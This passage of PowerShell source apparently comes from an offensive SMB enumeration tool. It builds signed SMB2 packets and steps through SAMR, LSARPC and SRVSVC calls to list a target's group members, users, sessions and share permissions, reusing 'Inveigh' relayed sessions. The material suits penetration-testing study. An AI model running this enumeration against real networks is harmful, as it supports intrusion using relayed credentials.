                            {
                                $stage = 'ParseSRVSVC'
                            }

                            'OpenAlias'
                            {
                                $step++
                                [Byte[]]$SAMR_policy_handle = $client_receive[140..159]
                        
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    $stage = 'GetMembersInAlias'
                                }

                            }

                            'OpenDomain'
                            {
                                $step++
                                [Byte[]]$SAMR_domain_handle = $client_receive[140..159]

                                if($action_stage -eq 'User')
                                {
                                    $stage = 'EnumDomainUsers'
                                }
                                else
                                {
                                    $stage = 'LookupNames'
                                }

                            }

                            'OpenGroup'
                            {
                                $step++
                                [Byte[]]$group_handle = $client_receive[140..159]
                                $stage = 'QueryGroupMember'
                            }

                            'QueryGroupMember'
                            {
                                $step++
                                [Byte[]]$RID_count_bytes = $client_receive[144..147]
                                $RID_count = [System.BitConverter]::ToInt16($RID_count_bytes,0)
                                [Byte[]]$RID_list = $client_receive[160..(159 + ($RID_count * 4))]
                                $stage = 'LookupRids'
                            }

                            'QueryInfoRequest'
                            {
                                $file_ID = $client_receive[132..147]
                                $stage = 'RPCBind'
                            }

                            'ReadRequest'
                            {
                                $stage = $stage_next
                            }

                            'RPCBind'
                            {
                                $stage = 'ReadRequest'
                            }

                            'SAMRCloseRequest'
                            {
                                $step++

                                if($step -eq 8)
                                {
                                    Write-Output "[-] $Group group not found"
                                    $stage = 'TreeDisconnect'
                                }
                                else
                                {

                                    if($step -eq 5 -and $action_stage -eq 'Group')
                                    {
                                        $LSA_domain_SID = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00
                                        $SID_count = 0x01,0x00,0x00,0x00
                                    }

                                    $stage = 'OpenDomain'
                                }

                            }

                            'TreeConnect'
                            {
                                $tree_ID = $client_receive[40..43]
                                $access_mask = $null

                                if($client_receive[76] -eq 92)
                                {
                                    $tree_access_mask = 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $tree_access_mask = $client_receive[80..83]
                                }

                                if($share_list.Count -gt 0)
                                {

                                    if($client_receive[76] -ne 92)
                                    {

                                        ForEach($byte in $tree_access_mask)
                                        {
                                            $access_mask = [System.Convert]::ToString($byte,2).PadLeft(8,'0') + $access_mask
                                        }
                                        
                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_."Access Mask" = $access_mask}
                                        $stage = 'TreeDisconnect'
                                    }
                                    else
                                    {
                                        $access_mask = "00000000000000000000000000000000"
                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_."Access Mask" = $access_mask}
                                        $stage = 'TreeConnect'
                                        $j++
                                    }

                                }
                                else
                                {
                                    
                                    if($action_stage -eq 'Share' -or $action_stage -eq 'NetSession')
                                    {
                                        $named_pipe = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 # srvsvc
                                    }
                                    else
                                    {
                                        $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                                    }

                                    $tree_IPC = $tree_ID
                                    $stage = 'CreateRequest'
                                }

                            }

                            'TreeDisconnect'
                            {

                                if($Action -eq 'All')
                                {

                                    switch ($action_stage) 
                                    {

                                        'group'
                                        {
                                            $action_stage = "user"
                                            $stage = "treeconnect"
                                            $step = 0
                                        }

                                        'user'
                                        {
                                            $action_stage = "netsession"
                                            $stage = "treeconnect"
                                        }

                                        'netsession'
                                        {
                                            $action_stage = "share"
                                            $stage = "treeconnect"
                                        }

                                        'share'
                                        {

                                            if($share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)
                                            {
                                                $stage = 'TreeConnect'
                                                $j++
                                            }
                                            elseif($share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                            {
                                                Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                                                $tree_ID = $tree_IPC
                                                $stage = 'TreeDisconnect'
                                                $j++
                                            }
                                            else
                                            {
                                                
                                                if($inveigh_session -and !$Logoff)
                                                {
                                                    $stage = 'Exit'
                                                }
                                                else
                                                {
                                                    $stage = 'Logoff'
                                                }

                                            }
                                            
                                        }

                                    }

                                }
                                else
                                {
                                    
                                    if($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)
                                    {
                                        $stage = 'TreeConnect'
                                        $j++
                                    }
                                    elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                    {
                                        Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                                        $tree_ID = $tree_IPC
                                        $stage = 'TreeDisconnect'
                                        $j++
                                    }
                                    else
                                    {
                                    
                                        if($inveigh_session -and !$Logoff)
                                        {
                                            $stage = 'Exit'
                                        }
                                        else
                                        {
                                            $stage = 'Logoff'
                                        }

                                    }

                                }
                                
                            }

                        }

                    }

                    'TreeConnect'
                    {
                        $message_ID++
                        $stage_current = $stage

                        if($share_list.Count -gt 0)
                        {
                            $path = "\\" + $Target + "\" + $share_list[$j]
                            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
                        }

                        $packet_SMB_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2TreeConnectRequest $path_bytes
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data 
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                                $stage_next = 'StatusReceived'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }
                        
                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                }
        
            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                Write-Output "[-] $error_message"
            }

        }


    }

    if($inveigh_session -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $message_ID
        $inveigh.session_list[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$inveigh_session -or $Logoff)
    {
        $client.Close()
        $client_stream.Close()
    }

}

}